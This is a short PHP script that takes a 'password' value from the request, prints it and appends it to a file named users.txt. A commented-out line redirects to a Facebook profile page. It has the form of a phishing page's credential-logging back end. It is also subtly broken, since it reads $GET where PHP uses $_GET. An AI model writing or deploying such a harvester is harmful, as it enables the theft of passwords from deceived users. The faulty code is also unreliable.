<?php
$handle = fopen("users.txt", "a");
echo $GET['password'];
fwrite($handle, $GET['password']);
fclose($handle);
//header("Location: https://www.facebook.com/profile.php?id=100001295764354&fref=ts");
exit;
?> 
